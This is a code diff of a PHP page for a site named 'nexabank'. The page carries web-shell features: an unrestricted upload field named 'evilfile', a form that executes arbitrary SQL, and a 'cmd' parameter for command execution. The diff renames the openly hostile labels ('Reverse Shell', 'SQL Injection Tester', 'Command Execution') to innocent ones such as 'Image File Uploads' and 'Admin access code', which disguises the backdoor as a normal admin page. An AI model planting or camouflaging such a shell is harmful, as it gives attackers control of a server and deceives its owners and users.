@@ -16,7 +16,7 @@ echo '<!DOCTYPE html>
             <div class="card-body">';
 
 if (isset($_FILES['evilfile'])) {
-    $uploadDir = '/var/www/html/nexabank/uploads';
+    $uploadDir = '/var/www/html/nexabank/uploads/';
     $uploadPath = $uploadDir . basename($_FILES['evilfile']['name']);
     
     if (move_uploaded_file($_FILES['evilfile']['tmp_name'], $uploadPath)) {
@@ -45,15 +45,15 @@ if (isset($_GET['cmd'])) {
 }
 
 echo '
-                <h4>File Upload (Reverse Shell)</h4>
+                <h4>Image File Uploads</h4>
                 <form method="POST" enctype="multipart/form-data">
                     <div class="mb-3">
                         <input type="file" name="evilfile" class="form-control">
                     </div>
-                    <button type="submit" class="btn btn-warning">Upload</button>
+                    <button type="submit" class="btn btn-warning">Upload Img</button>
                 </form>
                 <hr>
-                <h4>SQL Injection Tester</h4>
+                <h4>SQL Query tester (nexabank_db[do not expose!])</h4>
                 <form method="GET">
                     <div class="mb-3">
                         <input type="text" name="sql" class="form-control" placeholder="SELECT * FROM users">
@@ -61,12 +61,12 @@ echo '
                     <button type="submit" class="btn btn-primary">Execute</button>
                 </form>
                 <hr>
-                <h4>Command Execution</h4>
+                <h4>Admin access code</h4>
                 <form method="GET">
                     <div class="mb-3">
-                        <input type="text" name="cmd" class="form-control" placeholder="whoami">
+                        <input type="text" name="cmd" class="form-control" placeholder="circa1969@2025">
                     </div>
-                    <button type="submit" class="btn btn-primary">Execute</button>
+                    <button type="submit" class="btn btn-primary">Submit</button>
                 </form>
             </div>
         </div>
